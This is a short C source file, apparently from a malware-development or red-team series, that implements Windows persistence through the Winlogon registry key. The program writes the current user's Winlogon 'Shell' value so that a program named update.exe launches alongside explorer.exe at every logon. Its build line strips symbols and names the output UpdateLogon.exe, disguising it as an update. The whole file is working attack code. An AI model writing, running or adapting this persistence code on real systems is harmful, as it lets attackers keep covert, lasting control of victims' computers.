/*
    Persistence - Winlogon
    20 Jan 2025
    Eric

    To build: x86_64-w64-mingw32-gcc 03_registry_persist_winlogon.c -o UpdateLogon.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
*/
#include <windows.h>
#include <string.h>

int main(){
    HKEY hkey = NULL;

    // shell path
    const char* sh = "explorer.exe,update.exe";

    //open winlogon reg key, save into hkey
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
    
    // check for success
    if (result == ERROR_SUCCESS){
        // create key for persistence
        RegSetValueEx(hkey, (LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)sh, strlen(sh));
        RegCloseKey(hkey);
    }

    return 0;
}